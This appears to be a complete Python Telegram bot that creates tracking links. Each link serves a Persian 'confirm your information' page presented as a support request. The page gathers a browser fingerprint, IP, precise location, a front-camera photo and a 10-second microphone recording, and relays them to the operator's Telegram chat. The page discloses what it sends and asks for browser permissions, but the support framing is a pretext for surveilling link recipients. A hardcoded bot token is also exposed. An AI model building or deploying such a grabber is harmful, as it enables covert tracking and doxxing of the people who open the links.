#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ربات لینک‌ساز — فقط کتابخانه استاندارد پایتون (بدون pip install)

اجرا:
    python bot.py

آدرس عمومی خودکار تشخیص داده می‌شود از (به ترتیب):
    1) ngrok    (http://127.0.0.1:4040/api/tunnels)
    2) cloudflared (پوشه .cloudflared در کنار فایل)
    3) IP عمومی سرور
    4) http://127.0.0.1:PORT
"""

import base64
import html
import json
import os
import re
import secrets
import sqlite3
import threading
import time
import urllib.parse
import urllib.request
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ==================== تنظیمات ====================
BOT_TOKEN = "9141504502:AAHglOkjfM5fvcowWfNM9wqerY_zfSTVnI4"
PORT      = 8080
DATA_DIR  = "data"
DB_PATH   = os.path.join(DATA_DIR, "app.db")
API       = "https://api.telegram.org/bot" + BOT_TOKEN + "/"

os.makedirs(os.path.join(DATA_DIR, "media"), exist_ok=True)

DB_LOCK = threading.Lock()
DB = sqlite3.connect(DB_PATH, check_same_thread=False)
DB.executescript("""
CREATE TABLE IF NOT EXISTS admins (chat_id INTEGER PRIMARY KEY);
CREATE TABLE IF NOT EXISTS links  (slug TEXT PRIMARY KEY, label TEXT, created INTEGER, hits INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY AUTOINCREMENT, slug TEXT, kind TEXT, payload TEXT, created INTEGER);
""")
DB.commit()

BASE_URL = ""          # در main() خودکار پر می‌شود


def now() -> int:
    return int(time.time())


def esc(v) -> str:
    return html.escape(str(v if v is not None else "?"))


def q(sql: str, args=()):
    with DB_LOCK:
        cur = DB.execute(sql, args)
        DB.commit()
        return cur.fetchall()


# ==================== دیتابیس ====================
def get_admin():
    r = q("SELECT chat_id FROM admins LIMIT 1")
    return r[0][0] if r else None


def set_admin(chat_id: int) -> None:
    if get_admin() is None:
        q("INSERT OR IGNORE INTO admins (chat_id) VALUES (?)", (chat_id,))


def add_link(label: str) -> str:
    slug = secrets.token_hex(6)
    q("INSERT INTO links (slug, label, created, hits) VALUES (?,?,?,0)", (slug, label, now()))
    return slug


def link_info(slug: str):
    r = q("SELECT label, hits FROM links WHERE slug=?", (slug,))
    return (r[0][0], r[0][1]) if r else ("", 0)


def bump(slug: str) -> int:
    q("INSERT OR IGNORE INTO links (slug, label, created, hits) VALUES (?,?,?,0)", (slug, "", now()))
    q("UPDATE links SET hits = hits + 1 WHERE slug=?", (slug,))
    return link_info(slug)[1]


# ==================== تلگرام (urllib) ====================
def api(method: str, params=None, timeout: int = 25) -> dict:
    data = urllib.parse.urlencode(params or {}, doseq=True).encode()
    req = urllib.request.Request(API + method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[api]", method, e)
        return {}


def api_file(method: str, params: dict, field: str, path: str) -> dict:
    boundary = "----" + uuid.uuid4().hex
    filename = os.path.basename(path)
    ext = filename.rsplit(".", 1)[-1].lower()
    ctype = "image/jpeg" if field == "photo" else ("audio/ogg" if ext == "ogg" else "audio/webm")

    body = b""
    for k, v in params.items():
        body += (
            "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
            % (boundary, k, v)
        ).encode()
    body += (
        "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
        "Content-Type: %s\r\n\r\n" % (boundary, field, filename, ctype)
    ).encode()
    with open(path, "rb") as f:
        body += f.read()
    body += ("\r\n--%s--\r\n" % boundary).encode()

    req = urllib.request.Request(
        API + method, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + boundary},
    )
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[api_file]", method, e)
        return {}


def send(chat_id, text: str, markup: str = "") -> None:
    if not chat_id:
        return
    params = {"chat_id": chat_id, "text": text,
              "parse_mode": "HTML", "disable_web_page_preview": "true"}
    if markup:
        params["reply_markup"] = markup
    if len(text) <= 3800:
        api("sendMessage", params)
        return
    lines = text.split("\n")
    for i in range(0, len(lines), 30):
        p = dict(params)
        p["text"] = "\n".join(lines[i:i + 30])
        api("sendMessage", p)
        time.sleep(0.35)


def header(slug: str, label: str, hits: int) -> str:
    return ("🔔 <b>بازدید جدید</b>" + (" — " + esc(label) if label else "") + "\n"
            + "🔗 <code>" + esc(slug) + "</code> | بازدید #" + str(hits) + "\n")


# ==================== دستورات ربات ====================
HELP = ("سلام 👋\n"
        "/new [برچسب]  ← ساخت لینک جدید\n"
        "/list  ← لیست لینک‌ها\n"
        "/stats ← آمار\n"
        "/id    ← آی‌دی چت")


def handle_update(chat_id: int, text: str, msg: dict) -> None:
    if (msg.get("chat") or {}).get("type") != "private":
        send(chat_id, "فقط چت خصوصی.")
        return

    set_admin(chat_id)
    if chat_id != get_admin():
        send(chat_id, "⛔ دسترسی ندارید.")
        return

    parts = text.strip().split(None, 1)
    cmd = parts[0].lower().split("@")[0]
    arg = parts[1].strip() if len(parts) > 1 else ""

    if cmd in ("/start", "/help"):
        send(chat_id, HELP)

    elif cmd == "/new":
        slug = add_link(arg)
        url = BASE_URL + "/" + slug
        send(chat_id, "✅ لینک جدید:\n<code>" + esc(url) + "</code>"
             + ("\nبرچسب: " + esc(arg) if arg else "")
             + "\n\nصفحه به بازدیدکننده می‌گوید چه اطلاعاتی ارسال می‌شود.")

    elif cmd == "/list":
        rows = q("SELECT slug, label, hits, created FROM links ORDER BY created DESC LIMIT 50")
        if not rows:
            send(chat_id, "خالی است. /new بزن.")
            return
        out = "📋 لینک‌ها:\n"
        for slug, label, hits, created in rows:
            out += "<code>%s</code> | %s | %s hit\n" % (slug, esc(label or "-"), hits)
        send(chat_id, out)

    elif cmd == "/stats":
        n = q("SELECT COUNT(*) FROM links")[0][0]
        h = q("SELECT COALESCE(SUM(hits),0) FROM links")[0][0]
        send(chat_id, "📊 لینک‌ها: %s — کل بازدید: %s" % (n, h))

    elif cmd == "/id":
        send(chat_id, "chat_id: <code>%s</code>" % chat_id)


def poll_loop() -> None:
    offset = 0
    while True:
        try:
            r = api("getUpdates", {"offset": offset, "timeout": 30}, timeout=60)
            for u in r.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message") or u.get("edited_message") or {}
                txt = msg.get("text") or ""
                chat = (msg.get("chat") or {}).get("id")
                if chat and txt:
                    try:
                        handle_update(chat, txt, msg)
                    except Exception as e:
                        print("[handler]", e)
            time.sleep(0.5)
        except Exception as e:
            print("[poll]", e)
            time.sleep(3)


# ==================== پردازش داده‌ها ====================
def handle_fp(slug: str, body: dict, ip: str) -> None:
    d = body.get("data") or {}
    label, hits = link_info(slug)
    q("INSERT INTO events (slug, kind, payload, created) VALUES (?,?,?,?)",
      (slug, "fp", json.dumps({"ip": ip, "data": d}, ensure_ascii=False), now()))

    admin = get_admin()
    if not admin:
        return
    he = d.get("highEntropy") or {}
    sc = d.get("screen") or {}
    bt = d.get("battery") or {}
    gp = d.get("gpu") or {}
    lines = [
        header(slug, label, hits),
        "🌐 IP: <code>%s</code>" % esc(ip),
        "🕒 %s | %s (UTC%s)" % (esc(d.get("clientTime")), esc(d.get("timeZone")), esc(d.get("tzOffsetMin"))),
        "📱 UA: %s" % esc(d.get("ua")),
        "📲 پلتفرم: %s | مدل: %s" % (
            esc(((he.get("platform") or "?") + " " + str(he.get("platformVersion") or "")).strip()),
            esc(he.get("model") or "-")),
        "🖥 صفحه: %s×%s | dpr %s" % (esc(sc.get("w")), esc(sc.get("h")), esc(sc.get("dpr"))),
        "🧠 CPU: %s هسته | RAM: %sGB | لمس: %s" % (
            esc(d.get("cores")), esc(d.get("deviceMemory")), esc(d.get("maxTouchPoints"))),
        "🎮 GPU: %s" % esc(gp.get("unmaskedRenderer") or gp.get("renderer") or "?"),
        "🔋 باتری: %s | شارژ: %s" % (esc(bt.get("level")), "بله" if bt.get("charging") else "خیر"),
        "📶 شبکه: %s" % esc(json.dumps(d.get("network"), ensure_ascii=False) if d.get("network") else "?"),
        "🗣 زبان: %s | locale: %s" % (esc(d.get("langs")), esc(d.get("locale"))),
        "🖌 canvas: <code>%s</code>" % esc(d.get("canvasFp")),
    ]
    phone = (body.get("phone") or "").strip()
    if phone:
        lines.append("📞 شماره (اختیاری): <code>%s</code>" % esc(phone))
    send(admin, "\n".join(lines))


def handle_geo(slug: str, body: dict) -> None:
    lat, lon = body.get("lat"), body.get("lon")
    acc = body.get("acc") or 0
    label, hits = link_info(slug)
    q("INSERT INTO events (slug, kind, payload, created) VALUES (?,?,?,?)",
      (slug, "geo", json.dumps(body, ensure_ascii=False), now()))
    admin = get_admin()
    if not admin or lat is None:
        return
    send(admin, header(slug, label, hits)
         + "📍 موقعیت: <code>%s, %s</code> (دقت %sm)\n" % (lat, lon, acc)
         + "https://maps.google.com/?q=%s,%s" % (lat, lon))
    api("sendLocation", {"chat_id": admin, "latitude": lat, "longitude": lon})


def handle_media(slug: str, kind: str, body: dict) -> None:
    data = body.get("data") or ""
    mime = body.get("mime") or ""
    if "base64," in data:
        head, data = data.split("base64,", 1)
        if not mime and "data:" in head:
            mime = head.split("data:")[1].split(";")[0]
    try:
        raw = base64.b64decode(data)
    except Exception:
        return
    if len(raw) < 200:
        return

    label, hits = link_info(slug)
    ext = "jpg" if kind == "photo" else ("ogg" if "ogg" in mime else "webm")
    path = os.path.join(DATA_DIR, "media", "%s-%s.%s" % (slug, int(time.time()), ext))
    with open(path, "wb") as f:
        f.write(raw)

    q("INSERT INTO events (slug, kind, payload, created) VALUES (?,?,?,?)",
      (slug, kind, json.dumps({"path": path, "mime": mime}, ensure_ascii=False), now()))

    admin = get_admin()
    if not admin:
        return
    cap = header(slug, label, hits) + ("📷 عکس دوربین" if kind == "photo" else "🎤 صدای میکروفن")
    params = {"chat_id": admin, "caption": cap, "parse_mode": "HTML"}
    if kind == "photo":
        api_file("sendPhoto", params, "photo", path)
    elif ext == "ogg":
        api_file("sendVoice", params, "voice", path)
    else:
        api_file("sendAudio", params, "audio", path)


# ==================== صفحه ====================
PAGE = r"""<!doctype html>
<html lang="fa" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>دریافت و تأیید اطلاعات</title>
<style>
  :root{color-scheme:dark}
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
       background:#0f1115;color:#e8e8e8;font-family:Tahoma,system-ui,sans-serif;padding:20px}
  .card{max-width:360px;width:100%}
  h3{margin:0 0 6px;font-size:17px}
  p.note{font-size:12px;line-height:1.9;opacity:.6;margin:0 0 16px}
  button{width:100%;padding:13px;margin:6px 0;border:0;border-radius:12px;font-size:14px;
         font-family:inherit;background:#1e2530;color:#e8e8e8;cursor:pointer}
  button.main{background:#3aa0ff;color:#071018;font-weight:700}
  button:active{opacity:.7}
  input{width:100%;padding:11px;margin:4px 0 10px;border-radius:10px;border:1px solid #2a2f3a;
        background:#161b23;color:#e8e8e8;font-family:inherit;box-sizing:border-box}
  #st{font-size:12px;opacity:.55;margin-top:12px;min-height:18px}
</style>
</head>
<body>
<div class="card">
  <h3>دریافت و تأیید اطلاعات</h3>
  <p class="note">
    با زدن هر دکمه، اطلاعات همان بخش برای پشتیبانی ارسال می‌شود:
    مدل دستگاه و مرورگر، IP، و در صورت اجازه‌ی شما موقعیت مکانی، عکس و صدا.
    هر بخش را می‌توانید تأیید یا رد کنید.
  </p>
  <input id="phone" placeholder="شماره تماس (اختیاری)" inputmode="tel">
  <button class="main" id="all">✅ ارسال همه با هم</button>
  <button id="info">🖥 اطلاعات دستگاه و IP</button>
  <button id="geo">📍 موقعیت مکانی</button>
  <button id="cam">📷 عکس</button>
  <button id="mic">🎤 ۱۰ ثانیه صدا</button>
  <div id="st"></div>
</div>
<script>
const SLUG = "__SLUG__";
const API  = "/api/" + SLUG;
const st   = document.getElementById("st");
const say  = t => { st.textContent = t; };

const hash = s => { let h=5381; for (let i=0;i<s.length;i++) h=((h<<5)+h+s.charCodeAt(i))>>>0;
  return h.toString(16).padStart(8,"0"); };

async function fingerprint() {
  const o = {};
  o.ua = navigator.userAgent; o.platform = navigator.platform;
  o.langs = (navigator.languages || [navigator.language]).join(",");
  o.locale = Intl.DateTimeFormat().resolvedOptions().locale;
  o.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  o.tzOffsetMin = new Date().getTimezoneOffset();
  o.clientTime = new Date().toString();
  o.screen = { w: screen.width, h: screen.height, dpr: devicePixelRatio, depth: screen.colorDepth };
  o.cores = navigator.hardwareConcurrency; o.deviceMemory = navigator.deviceMemory;
  o.maxTouchPoints = navigator.maxTouchPoints;
  if (navigator.userAgentData) {
    try { o.highEntropy = await navigator.userAgentData.getHighEntropyValues(
      ["model","platform","platformVersion","architecture","bitness"]); } catch(e){}
  }
  try { if (navigator.getBattery) { const b = await navigator.getBattery();
    o.battery = { level: Math.round(b.level*100)+"%", charging: b.charging }; } } catch(e){}
  try { if (navigator.connection) { const n = navigator.connection;
    o.network = { type: n.effectiveType, downlink: n.downlink, rtt: n.rtt }; } } catch(e){}
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) { const ex = gl.getExtension("WEBGL_debug_renderer_info");
      o.gpu = { renderer: gl.getParameter(gl.RENDERER),
                unmaskedRenderer: ex ? gl.getParameter(ex.UNMASKED_RENDERER_WEBGL) : null }; }
  } catch(e){}
  try {
    const c = document.createElement("canvas"); c.width=220; c.height=50;
    const x = c.getContext("2d"); x.font="14px Arial"; x.fillStyle="#f60";
    x.fillText("fp-test", 2, 20); o.canvasFp = hash(c.toDataURL());
  } catch(e){}
  return o;
}

const post = (url, obj) => fetch(url, {
  method: "POST", headers: { "Content-Type": "application/json" },
  body: JSON.stringify(obj), keepalive: true
}).catch(() => {});

async function sendInfo() {
  const d = await fingerprint();
  await post(API + "/fp", { data: d, phone: document.getElementById("phone").value });
  say("اطلاعات دستگاه ارسال شد ✅");
}

function sendGeo() {
  return new Promise(res => {
    if (!navigator.geolocation) { say("موقعیت پشتیبانی نمی‌شود"); return res(); }
    say("در حال دریافت موقعیت…");
    navigator.geolocation.getCurrentPosition(
      p => { post(API + "/geo", { lat: +p.coords.latitude.toFixed(6),
        lon: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) });
        say("موقعیت ارسال شد ✅"); res(); },
      () => { say("اجازه‌ی موقعیت داده نشد"); res(); },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
  });
}

async function sendCam() {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const v = document.createElement("video");
    v.srcObject = s; v.muted = true; v.playsInline = true;
    await v.play(); await new Promise(r => setTimeout(r, 800));
    const c = document.createElement("canvas");
    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
    c.getContext("2d").drawImage(v, 0, 0);
    s.getTracks().forEach(t => t.stop());
    await post(API + "/photo", { data: c.toDataURL("image/jpeg", 0.8), mime: "image/jpeg" });
    say("عکس ارسال شد ✅");
  } catch (e) { say("اجازه‌ی دوربین داده نشد"); }
}

async function sendMic() {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mime = (window.MediaRecorder && MediaRecorder.isTypeSupported("audio/ogg;codecs=opus"))
      ? "audio/ogg;codecs=opus" : "audio/webm";
    const mr = new MediaRecorder(s, { mimeType: mime });
    const parts = []; mr.ondataavailable = e => parts.push(e.data);
    say("در حال ضبط ۱۰ ثانیه…");
    mr.start(); await new Promise(r => setTimeout(r, 10000));
    await new Promise(r => { mr.onstop = r; mr.stop(); });
    s.getTracks().forEach(t => t.stop());
    const blob = new Blob(parts, { type: mime });
    const data = await new Promise(r => { const fr = new FileReader();
      fr.onload = () => r(fr.result); fr.readAsDataURL(blob); });
    await post(API + "/voice", { data, mime: mime.split(";")[0] });
    say("صدا ارسال شد ✅");
  } catch (e) { say("اجازه‌ی میکروفن داده نشد"); }
}

document.getElementById("info").onclick = sendInfo;
document.getElementById("geo").onclick  = sendGeo;
document.getElementById("cam").onclick  = sendCam;
document.getElementById("mic").onclick  = sendMic;
document.getElementById("all").onclick = async () => {
  say("در حال ارسال…");
  await sendInfo(); await sendGeo(); await sendCam(); await sendMic();
  say("تمام شد ✅ ممنون");
};
</script>
</body>
</html>
"""


# ==================== سرور HTTP ====================
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _out(self, code: int, body, ctype="text/html; charset=utf-8"):
        b = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b)

    def _ip(self) -> str:
        fwd = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For")
        if fwd:
            return fwd.split(",")[0].strip()
        return self.client_address[0]

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path.strip("/")
        if re.fullmatch(r"[a-z0-9]{4,32}", path):
            bump(path)
            self._out(200, PAGE.replace("__SLUG__", path))
            return
        self._out(200, "OK")

    def do_POST(self):
        parts = urllib.parse.urlparse(self.path).path.strip("/").split("/")
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n)
        try:
            body = json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            body = {}

        if len(parts) == 3 and parts[0] == "api":
            slug = re.sub(r"[^a-z0-9]", "", parts[1])
            kind = parts[2]
            try:
                if kind == "fp":
                    handle_fp(slug, body, self._ip())
                elif kind == "geo":
                    handle_geo(slug, body)
                elif kind in ("photo", "voice"):
                    handle_media(slug, kind, body)
            except Exception as e:
                print("[post]", e)
            self._out(200, '{"ok":true}', "application/json")
            return
        self._out(404, '{"ok":false}', "application/json")


# ==================== تشخیص آدرس عمومی ====================
def detect_base_url(port: int) -> str:
    # 1) ngrok
    try:
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3) as r:
            for t in json.loads(r.read().decode()).get("tunnels", []):
                if str(t.get("public_url", "")).startswith("https://"):
                    return t["public_url"].rstrip("/")
    except Exception:
        pass

    # 2) cloudflared (فایل json کنار اسکریپت)
    for name in (".cloudflared", "cloudflared.json", "tunnel.json"):
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
        if os.path.isfile(p):
            try:
                with open(p) as f:
                    url = json.load(f).get("url") or json.load(f).get("public_url")
                if url:
                    return url.rstrip("/")
            except Exception:
                pass

    # 3) IP عمومی
    for svc in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://ipecho.net/plain"):
        try:
            with urllib.request.urlopen(svc, timeout=5) as r:
                ip = r.read().decode().strip()
            if re.fullmatch(r"[0-9a-fA-F.:]+", ip):
                return "http://%s:%d" % (ip, port)
        except Exception:
            pass

    # 4) لوکال
    return "http://127.0.0.1:%d" % port


# ==================== main ====================
def main() -> None:
    global BASE_URL
    BASE_URL = detect_base_url(PORT)

    threading.Thread(target=poll_loop, daemon=True).start()

    srv = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print("✅ سرور: http://0.0.0.0:%d" % PORT)
    print("🌍 آدرس پایه: %s" % BASE_URL)
    print("➡️  در تلگرام /start بده، بعد /new [برچسب]")
    print("   (Ctrl+C برای خروج)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nخروج.")
        srv.shutdown()


if __name__ == "__main__":
    main()
